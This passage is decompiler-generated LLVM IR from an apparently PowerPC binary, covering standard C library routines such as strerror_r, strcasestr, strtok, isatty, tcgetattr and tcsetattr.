  %v0_1000e1ec.sink = phi i32 [ %v0_1000e1ec.sink.pre, %dec_label_pc_1000e1dc ], [ %v1_1000e1ec, %dec_label_pc_1000e220.preheader ], [ %v1_1000e21c, %dec_label_pc_1000e21c ], [ %v1_1000e208, %dec_label_pc_1000e208 ]
  %v1_1000e1ec = add i32 %v0_1000e1ec.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1000e1ec to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1000e1ec, i32* %r11.global-to-local, align 4
  %v1_1000e230 = load i32, i32* %r5.global-to-local, align 4
  %v4_1000e230 = icmp eq i32 %storemerge4, %v1_1000e230
  br i1 %v4_1000e230, label %dec_label_pc_1000e238, label %dec_label_pc_1000e220.preheader

dec_label_pc_1000e238:                            ; preds = %dec_label_pc_1000e230
  %v1_1000e238 = add i32 %v0_1000e1ec.sink, 2
  %v2_1000e238 = inttoptr i32 %v1_1000e238 to i8*
  %v3_1000e238 = load i8, i8* %v2_1000e238, align 1
  %v4_1000e238 = zext i8 %v3_1000e238 to i32
  store i32 %v4_1000e238, i32* %r10.global-to-local, align 4
  store i32 %v0_1000e1ec.sink, i32* %r3.global-to-local, align 4
  %v0_1000e240 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000e240 = add i32 %v0_1000e240, 1
  %v2_1000e240 = inttoptr i32 %v1_1000e240 to i8*
  %v3_1000e240 = load i8, i8* %v2_1000e240, align 1
  %v4_1000e240 = zext i8 %v3_1000e240 to i32
  store i32 %v1_1000e240, i32* %r8.global-to-local, align 4
  store i32 %v1_1000e238, i32* %r11.global-to-local, align 4
  %v4_1000e24c = icmp eq i8 %v3_1000e238, %v3_1000e240
  br i1 %v4_1000e24c, label %dec_label_pc_1000e254, label %dec_label_pc_1000e298

dec_label_pc_1000e254:                            ; preds = %dec_label_pc_1000e238, %dec_label_pc_1000e280.dec_label_pc_1000e254_crit_edge
  %v0_1000e25c = phi i32 [ %v0_1000e25c.pre, %dec_label_pc_1000e280.dec_label_pc_1000e254_crit_edge ], [ %v1_1000e240, %dec_label_pc_1000e238 ]
  %v0_1000e258 = phi i32 [ %v0_1000e258.pre, %dec_label_pc_1000e280.dec_label_pc_1000e254_crit_edge ], [ %v1_1000e238, %dec_label_pc_1000e238 ]
  %v0_1000e254 = phi i32 [ %v4_1000e284, %dec_label_pc_1000e280.dec_label_pc_1000e254_crit_edge ], [ %v4_1000e238, %dec_label_pc_1000e238 ]
  %v3_1000e254 = icmp eq i32 %v0_1000e254, 0
  %v1_1000e258 = add i32 %v0_1000e258, 1
  store i32 %v1_1000e258, i32* %r7.global-to-local, align 4
  %v1_1000e25c = add i32 %v0_1000e25c, 1
  store i32 %v1_1000e25c, i32* %r10.global-to-local, align 4
  %v0_1000e260 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e254, i32 %v0_1000e260)
  %v0_1000e264 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000e264 = add i32 %v0_1000e264, 1
  %v2_1000e264 = inttoptr i32 %v1_1000e264 to i8*
  %v3_1000e264 = load i8, i8* %v2_1000e264, align 1
  %v4_1000e264 = zext i8 %v3_1000e264 to i32
  %v0_1000e268 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e268 = add i32 %v0_1000e268, 1
  store i32 %v1_1000e268, i32* %r8.global-to-local, align 4
  %v0_1000e26c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e26c = add i32 %v0_1000e26c, 1
  %v2_1000e26c = inttoptr i32 %v1_1000e26c to i8*
  %v3_1000e26c = load i8, i8* %v2_1000e26c, align 1
  %v0_1000e270 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000e270 = add i32 %v0_1000e270, 1
  store i32 %v1_1000e270, i32* %r11.global-to-local, align 4
  %v4_1000e278 = icmp eq i8 %v3_1000e26c, %v3_1000e264
  br i1 %v4_1000e278, label %dec_label_pc_1000e280, label %dec_label_pc_1000e298

dec_label_pc_1000e280:                            ; preds = %dec_label_pc_1000e254
  %v3_1000e274 = icmp eq i8 %v3_1000e264, 0
  %v0_1000e280 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e274, i32 %v0_1000e280)
  %v0_1000e284 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e284 = add i32 %v0_1000e284, 1
  %v2_1000e284 = inttoptr i32 %v1_1000e284 to i8*
  %v3_1000e284 = load i8, i8* %v2_1000e284, align 1
  %v4_1000e284 = zext i8 %v3_1000e284 to i32
  %v0_1000e288 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000e288 = add i32 %v0_1000e288, 1
  %v2_1000e288 = inttoptr i32 %v1_1000e288 to i8*
  %v3_1000e288 = load i8, i8* %v2_1000e288, align 1
  store i32 %v4_1000e284, i32* %r10.global-to-local, align 4
  %v4_1000e290 = icmp eq i8 %v3_1000e288, %v3_1000e284
  br i1 %v4_1000e290, label %dec_label_pc_1000e280.dec_label_pc_1000e254_crit_edge, label %dec_label_pc_1000e298

dec_label_pc_1000e280.dec_label_pc_1000e254_crit_edge: ; preds = %dec_label_pc_1000e280
  %v0_1000e258.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000e25c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000e254

dec_label_pc_1000e298:                            ; preds = %dec_label_pc_1000e280, %dec_label_pc_1000e254, %dec_label_pc_1000e238
  %v0_1000e298 = phi i32 [ %v4_1000e240, %dec_label_pc_1000e238 ], [ %v4_1000e284, %dec_label_pc_1000e280 ], [ %v4_1000e264, %dec_label_pc_1000e254 ]
  %v3_1000e298 = icmp eq i32 %v0_1000e298, 0
  br i1 %v3_1000e298, label %dec_label_pc_1000e2a0, label %dec_label_pc_1000e1f8

dec_label_pc_1000e2a0:                            ; preds = %dec_label_pc_1000e298
  ret i32 %v0_1000e1ec.sink

dec_label_pc_1000e2a4:                            ; preds = %dec_label_pc_1000e1c8, %dec_label_pc_1000e218, %dec_label_pc_1000e204
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1000e284, { 0, 2, 1 }
  uselistorder i8 %v3_1000e264, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1000e1ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000e1ec.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000e21c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000e20828, { 1, 0 }
  uselistorder i32 %v1_1000e220.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1000e1c8, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000e2a4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e254, { 1, 0 }
  uselistorder label %dec_label_pc_1000e230, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000e204, { 1, 0 }
  uselistorder label %dec_label_pc_1000e220.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268493508, i32* @lr, align 4
  %v0_1000e2c0 = call i32 @__xpg_strerror_r()
  %v0_1000e2c8 = load i32, i32* @r29, align 4
  ret i32 %v0_1000e2c8
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000e2dc = load i32, i32* @r3, align 4
  %v2_1000e2dc = icmp ugt i32 %v0_1000e2dc, 124
  %v0_1000e2ec = load i32, i32* @r4, align 4
  store i32 %v0_1000e2ec, i32* %r27.global-to-local, align 4
  %v0_1000e2f4 = load i32, i32* @r5, align 4
  br i1 %v2_1000e2dc, label %dec_label_pc_1000e338, label %dec_label_pc_1000e2fc

dec_label_pc_1000e2fc:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_100194fc.733 to i32), i32* %r30.global-to-local, align 4
  %v3_1000e3187 = icmp eq i32 %v0_1000e2dc, 0
  br i1 %v3_1000e3187, label %dec_label_pc_1000e32c, label %dec_label_pc_1000e30c

dec_label_pc_1000e30c:                            ; preds = %dec_label_pc_1000e2fc, %dec_label_pc_1000e30c
  %v0_1000e310 = phi i32 [ %v1_1000e310, %dec_label_pc_1000e30c ], [ ptrtoint ([8 x i8]* @global_var_100194fc.733 to i32), %dec_label_pc_1000e2fc ]
  %v1_1000e310 = add i32 %v0_1000e310, 1
  store i32 %v1_1000e310, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e30c

dec_label_pc_1000e32c:                            ; preds = %dec_label_pc_1000e2fc
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000e36c

dec_label_pc_1000e338:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000e2dc, 0
  %v1_1000e33c = zext i1 %tmp to i32
  %v2_1000e33c = ashr i32 %v0_1000e2dc, 31
  %v3_1000e33c = and i32 %v2_1000e33c, -2
  %v4_1000e33c = or i32 %v3_1000e33c, %v1_1000e33c
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000e350 = bitcast i32* %stack_var_-39 to i8*
  %v6_1000e350 = call i32 @_uintmaxtostr(i8* %v5_1000e350, i32 %v4_1000e33c, i32 %v0_1000e2dc, i32 -10, i32 0)
  %v1_1000e358 = add i32 %v6_1000e350, -14
  store i32 %v1_1000e358, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_100194ec.734 to i32), i32* @r4, align 4
  store i32 %v1_1000e358, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268493676, i32* @lr, align 4
  %v0_1000e368 = call i32 @memcpy()
  %v0_1000e36c.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000e370.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000e380.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000e36c

dec_label_pc_1000e36c:                            ; preds = %dec_label_pc_1000e32c, %dec_label_pc_1000e338
  %v0_1000e380 = phi i32 [ %v0_1000e2f4, %dec_label_pc_1000e32c ], [ %v0_1000e380.pre, %dec_label_pc_1000e338 ]
  %v0_1000e370 = phi i32 [ ptrtoint ([8 x i8]* @global_var_100194fc.733 to i32), %dec_label_pc_1000e32c ], [ %v0_1000e370.pre, %dec_label_pc_1000e338 ]
  %v1_1000e374 = phi i32 [ %v0_1000e2ec, %dec_label_pc_1000e32c ], [ %v0_1000e36c.pre, %dec_label_pc_1000e338 ]
  %tmp19 = icmp slt i32 %v1_1000e374, 0
  %v1_1000e36c = zext i1 %tmp19 to i32
  %v2_1000e36c = ashr i32 %v1_1000e374, 31
  %v3_1000e36c = and i32 %v2_1000e36c, -2
  %v4_1000e36c = or i32 %v3_1000e36c, %v1_1000e36c
  store i32 %v0_1000e370, i32* @r3, align 4
  %v2_1000e374 = xor i32 %v4_1000e36c, %v1_1000e374
  %v2_1000e378 = sub i32 %v4_1000e36c, %v2_1000e374
  %tmp20 = icmp slt i32 %v2_1000e378, 0
  %v1_1000e37c = zext i1 %tmp20 to i32
  %v2_1000e37c = ashr i32 %v2_1000e378, 31
  %v3_1000e37c = and i32 %v2_1000e37c, -2
  %v4_1000e37c = or i32 %v3_1000e37c, %v1_1000e37c
  %v2_1000e380 = and i32 %v4_1000e37c, %v0_1000e380
  store i32 %v2_1000e380, i32* @r29, align 4
  %v0_1000e384 = call i32 @__GI_strlen()
  %v1_1000e388 = add i32 %v0_1000e384, 1
  store i32 %v1_1000e388, i32* %r31.global-to-local, align 4
  %v1_1000e38c = load i32, i32* @r29, align 4
  %v3_1000e38c = icmp ugt i32 %v1_1000e388, %v1_1000e38c
  br i1 %v3_1000e38c, label %dec_label_pc_1000e394, label %dec_label_pc_1000e39c

dec_label_pc_1000e394:                            ; preds = %dec_label_pc_1000e36c
  store i32 %v1_1000e38c, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000e39c

dec_label_pc_1000e39c:                            ; preds = %dec_label_pc_1000e36c, %dec_label_pc_1000e394
  %v0_1000e3ac = phi i32 [ %v1_1000e38c, %dec_label_pc_1000e394 ], [ %v1_1000e388, %dec_label_pc_1000e36c ]
  %v3_1000e39c = icmp eq i32 %v0_1000e3ac, 0
  br i1 %v3_1000e39c, label %dec_label_pc_1000e3c0, label %dec_label_pc_1000e3a4

dec_label_pc_1000e3a4:                            ; preds = %dec_label_pc_1000e39c
  %v0_1000e3a4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000e3a4, i32* @r4, align 4
  %v0_1000e3a8 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000e3a8, i32* @r3, align 4
  store i32 %v0_1000e3ac, i32* @r5, align 4
  store i32 268493748, i32* @lr, align 4
  %v0_1000e3b0 = call i32 @memcpy()
  %v1_1000e3b4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e3b4 = add i32 %v1_1000e3b4, %v0_1000e3a8
  %v3_1000e3bc = add i32 %v2_1000e3b4, -1
  %v4_1000e3bc = inttoptr i32 %v3_1000e3bc to i8*
  store i8 0, i8* %v4_1000e3bc, align 1
  br label %dec_label_pc_1000e3c0

dec_label_pc_1000e3c0:                            ; preds = %dec_label_pc_1000e39c, %dec_label_pc_1000e3a4
  %v0_1000e3c0 = load i32, i32* %r28.global-to-local, align 4
  %v3_1000e3c0 = icmp eq i32 %v0_1000e3c0, 0
  br i1 %v3_1000e3c0, label %dec_label_pc_1000e3d0, label %dec_label_pc_1000e3c8

dec_label_pc_1000e3c8:                            ; preds = %dec_label_pc_1000e3c0
  %v0_1000e3c8 = call i32 @__errno_location()
  %v0_1000e3cc = load i32, i32* %r28.global-to-local, align 4
  %v2_1000e3cc = inttoptr i32 %v0_1000e3c8 to i32*
  store i32 %v0_1000e3cc, i32* %v2_1000e3cc, align 4
  %v0_1000e3d4.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000e3d0

dec_label_pc_1000e3d0:                            ; preds = %dec_label_pc_1000e3c0, %dec_label_pc_1000e3c8
  %v0_1000e3d4 = phi i32 [ 0, %dec_label_pc_1000e3c0 ], [ %v0_1000e3d4.pre, %dec_label_pc_1000e3c8 ]
  ret i32 %v0_1000e3d4

; uselistorder directives
  uselistorder i32 %v2_1000e378, { 1, 0 }
  uselistorder i32 %v4_1000e36c, { 1, 0 }
  uselistorder i32 %v1_1000e374, { 1, 2, 0 }
  uselistorder i32 %v1_1000e310, { 1, 0 }
  uselistorder i32 %v0_1000e2dc, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_100194fc.733 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e3d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e3c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e39c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e36c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e30c, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000e3f4 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000e3f4
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1000e400 = load i32, i32* bitcast (i32** @global_var_1002b8f4.736 to i32*), align 4
  store i32 %v3_1000e400, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e408

dec_label_pc_1000e408:                            ; preds = %dec_label_pc_1000e408.backedge, %entry
  %v0_1000e408 = phi i32 [ %v0_1000e408.pre, %dec_label_pc_1000e408.backedge ], [ %arg2, %entry ]
  %v1_1000e408 = inttoptr i32 %v0_1000e408 to i8*
  %v2_1000e408 = load i8, i8* %v1_1000e408, align 1
  %v3_1000e408 = zext i8 %v2_1000e408 to i32
  store i32 %v3_1000e408, i32* %r0.global-to-local, align 4
  %v1_1000e40c = add i32 %v0_1000e408, 1
  store i32 %v1_1000e40c, i32* %r10.global-to-local, align 4
  %v3_1000e410 = icmp eq i8 %v2_1000e408, 0
  %v1_1000e414 = mul nuw nsw i32 %v3_1000e408, 2
  store i32 %v1_1000e414, i32* %r9.global-to-local, align 4
  %v0_1000e418 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e410, i32 %v0_1000e418)
  %v0_1000e41c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000e41c = inttoptr i32 %v0_1000e41c to i8*
  %v2_1000e41c = load i8, i8* %v1_1000e41c, align 1
  %v3_1000e41c = zext i8 %v2_1000e41c to i32
  %v1_1000e420 = add i32 %v0_1000e41c, 1
  store i32 %v1_1000e420, i32* %r8.global-to-local, align 4
  %v0_1000e424 = load i32, i32* %r0.global-to-local, align 4
  %v4_1000e424 = icmp eq i32 %v0_1000e424, %v3_1000e41c
  br i1 %v4_1000e424, label %dec_label_pc_1000e408.backedge, label %dec_label_pc_1000e430

dec_label_pc_1000e408.backedge:                   ; preds = %dec_label_pc_1000e408, %dec_label_pc_1000e430, %dec_label_pc_1000e444
  %v0_1000e408.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e408

dec_label_pc_1000e430:                            ; preds = %dec_label_pc_1000e408
  %v1_1000e428 = mul nuw nsw i32 %v3_1000e41c, 2
  %v0_1000e430 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e430 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000e430 = add i32 %v1_1000e430, %v0_1000e430
  %v3_1000e430 = inttoptr i32 %v2_1000e430 to i16*
  %v4_1000e430 = load i16, i16* %v3_1000e430, align 2
  %v5_1000e430 = sext i16 %v4_1000e430 to i32
  store i32 %v5_1000e430, i32* %r9.global-to-local, align 4
  %v2_1000e438 = add i32 %v1_1000e430, %v1_1000e428
  %v3_1000e438 = inttoptr i32 %v2_1000e438 to i16*
  %v4_1000e438 = load i16, i16* %v3_1000e438, align 2
  %v5_1000e438 = sext i16 %v4_1000e438 to i32
  store i32 %v5_1000e438, i32* %r0.global-to-local, align 4
  %v4_1000e43c = icmp eq i16 %v4_1000e430, %v4_1000e438
  br i1 %v4_1000e43c, label %dec_label_pc_1000e408.backedge, label %dec_label_pc_1000e444

dec_label_pc_1000e444:                            ; preds = %dec_label_pc_1000e430
  %v3_1000e434 = icmp eq i8 %v2_1000e41c, 0
  %v0_1000e444 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000e444 = add i32 %v0_1000e444, 1
  store i32 %v1_1000e444, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1000e444, i32* %r8.global-to-local, align 4
  br i1 %v3_1000e434, label %dec_label_pc_1000e454, label %dec_label_pc_1000e408.backedge

dec_label_pc_1000e454:                            ; preds = %dec_label_pc_1000e444
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000e408, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e408.backedge, { 2, 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1002b938.737 to i32), i32* @r5, align 4
  %v1_1000e464 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_1002b938.737 to i32))
  ret i32 %v1_1000e464
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268493948, i32* @lr, align 4
  %v2_1000e478 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_4()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000e498 = load i32, i32* @lr, align 4
  store i32 %v0_1000e498, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000e4a8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268494012, i32* @lr, align 4
  %v3_1000e4b8 = call i32 @ioctl(i32 1076655123, i32 %v2_1000e4a8, i32 %v2_1000e4a8)
  %v2_1000e4bc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e4bc, i32* @r4, align 4
  store i32 %v3_1000e4b8, i32* @r30, align 4
  %v3_1000e4c0 = icmp eq i32 %v3_1000e4b8, 0
  store i32 19, i32* @r5, align 4
  %v0_1000e4c8 = load i32, i32* @r31, align 4
  br i1 %v3_1000e4c0, label %dec_label_pc_1000e4d0, label %dec_label_pc_1000e518

dec_label_pc_1000e4d0:                            ; preds = %entry
  %v1_1000e4c8 = add i32 %v0_1000e4c8, 17
  %v3_1000e4e8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000e4e8, i32* %r0.global-to-local, align 4
  %v2_1000e4ec = add i32 %v0_1000e4c8, 4
  %v3_1000e4ec = inttoptr i32 %v2_1000e4ec to i32*
  store i32 %tmp7, i32* %v3_1000e4ec, align 4
  %v0_1000e4f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e4f0 = load i32, i32* @r31, align 4
  %v2_1000e4f0 = inttoptr i32 %v1_1000e4f0 to i32*
  store i32 %v0_1000e4f0, i32* %v2_1000e4f0, align 4
  %v0_1000e4f4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e4f4 = load i32, i32* @r31, align 4
  %v2_1000e4f4 = add i32 %v1_1000e4f4, 8
  %v3_1000e4f4 = inttoptr i32 %v2_1000e4f4 to i32*
  store i32 %v0_1000e4f4, i32* %v3_1000e4f4, align 4
  %v0_1000e4f8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e4f8 = load i32, i32* @r31, align 4
  %v2_1000e4f8 = add i32 %v1_1000e4f8, 12
  %v3_1000e4f8 = inttoptr i32 %v2_1000e4f8 to i32*
  store i32 %v0_1000e4f8, i32* %v3_1000e4f8, align 4
  %v3_1000e4fc = load i32, i32* @r31, align 4
  %v4_1000e4fc = add i32 %v3_1000e4fc, 16
  %v5_1000e4fc = inttoptr i32 %v4_1000e4fc to i8*
  store i8 %tmp4, i8* %v5_1000e4fc, align 1
  %v1_1000e500 = load i32, i32* @r31, align 4
  %v2_1000e500 = add i32 %v1_1000e500, 52
  %v3_1000e500 = inttoptr i32 %v2_1000e500 to i32*
  store i32 %tmp3, i32* %v3_1000e500, align 4
  %v1_1000e504 = load i32, i32* @r31, align 4
  %v2_1000e504 = add i32 %v1_1000e504, 56
  %v3_1000e504 = inttoptr i32 %v2_1000e504 to i32*
  store i32 %tmp2, i32* %v3_1000e504, align 4
  store i32 268494092, i32* @lr, align 4
  %v6_1000e508 = sext i8 %tmp4 to i32
  %v8_1000e508 = call i32 @__GI_mempcpy(i32 %v1_1000e4c8, i32 %v2_1000e4bc, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000e508, i32 %tmp7)
  store i32 268494104, i32* @lr, align 4
  %v3_1000e514 = call i32 @__GI_memset(i32 %v8_1000e508, i32 0, i32 13)
  %v0_1000e51c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e518

dec_label_pc_1000e518:                            ; preds = %entry, %dec_label_pc_1000e4d0
  %v0_1000e51c = phi i32 [ %v3_1000e4b8, %entry ], [ %v0_1000e51c.pre, %dec_label_pc_1000e4d0 ]
  store i32 %v0_1000e498, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000e51c

; uselistorder directives
  uselistorder i32 %v2_1000e4a8, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder label %dec_label_pc_1000e518, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000e530 = load i32, i32* @r4, align 4
  %v3_1000e530 = icmp eq i32 %v0_1000e530, 1
  %v0_1000e540 = load i32, i32* @r3, align 4
  store i32 %v0_1000e540, i32* @r27, align 4
  %v0_1000e548 = load i32, i32* @r5, align 4
  store i32 %v0_1000e548, i32* @r31, align 4
  br i1 %v3_1000e530, label %dec_label_pc_1000e56c, label %dec_label_pc_1000e550

dec_label_pc_1000e550:                            ; preds = %entry
  %v3_1000e550 = icmp eq i32 %v0_1000e530, 2
  br i1 %v3_1000e550, label %dec_label_pc_1000e58c, label %dec_label_pc_1000e558

dec_label_pc_1000e558:                            ; preds = %dec_label_pc_1000e550
  %v3_1000e558 = icmp eq i32 %v0_1000e530, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000e558, label %dec_label_pc_1000e594, label %dec_label_pc_1000e578

dec_label_pc_1000e56c:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000e594

dec_label_pc_1000e578:                            ; preds = %dec_label_pc_1000e558
  %v0_1000e578 = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000e584 = inttoptr i32 %v0_1000e578 to i32*
  store i32 22, i32* %v2_1000e584, align 4
  br label %dec_label_pc_1000e67c

dec_label_pc_1000e58c:                            ; preds = %dec_label_pc_1000e550
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000e594

dec_label_pc_1000e594:                            ; preds = %dec_label_pc_1000e558, %dec_label_pc_1000e56c, %dec_label_pc_1000e58c
  %v1_1000e594 = inttoptr i32 %v0_1000e548 to i32*
  %v2_1000e594 = load i32, i32* %v1_1000e594, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000e59c = add i32 %v0_1000e548, 4
  %v2_1000e59c = inttoptr i32 %v1_1000e59c to i32*
  %v3_1000e59c = load i32, i32* %v2_1000e59c, align 4
  store i32 %v3_1000e59c, i32* %r9.global-to-local, align 4
  %v1_1000e5a0 = add i32 %v0_1000e548, 17
  store i32 %v1_1000e5a0, i32* @r4, align 4
  %v1_1000e5a4 = add i32 %v0_1000e548, 8
  %v2_1000e5a4 = inttoptr i32 %v1_1000e5a4 to i32*
  %v3_1000e5a4 = load i32, i32* %v2_1000e5a4, align 4
  %v2_1000e5a8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000e5a8, i32* @r3, align 4
  %v2_1000e5b0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000e5b0, i32* @r26, align 4
  store i32 %v2_1000e594, i32* %stack_var_-72, align 4
  store i32 268494304, i32* @lr, align 4
  %v0_1000e5dc = call i32 @memcpy()
  %v0_1000e5e0 = load i32, i32* @r27, align 4
  %v0_1000e5e4 = load i32, i32* @r30, align 4
  store i32 268494324, i32* @lr, align 4
  %v3_1000e5f0 = call i32 @ioctl(i32 %v0_1000e5e0, i32 %v0_1000e5e4, i32 %v2_1000e5b0)
  store i32 %v3_1000e5f0, i32* @r28, align 4
  %v3_1000e5f4 = icmp eq i32 %v3_1000e5f0, 0
  br i1 %v3_1000e5f4, label %dec_label_pc_1000e5fc, label %dec_label_pc_1000e67c

dec_label_pc_1000e5fc:                            ; preds = %dec_label_pc_1000e594
  %v0_1000e5fc = load i32, i32* @r30, align 4
  %v3_1000e600 = icmp eq i32 %v0_1000e5fc, -2144570348
  br i1 %v3_1000e600, label %dec_label_pc_1000e608, label %dec_label_pc_1000e678

dec_label_pc_1000e608:                            ; preds = %dec_label_pc_1000e5fc
  %v0_1000e608 = call i32 @__errno_location()
  store i32 %v0_1000e608, i32* @r29, align 4
  %v0_1000e618 = load i32, i32* @r27, align 4
  %v1_1000e620 = inttoptr i32 %v0_1000e608 to i32*
  %v2_1000e620 = load i32, i32* %v1_1000e620, align 4
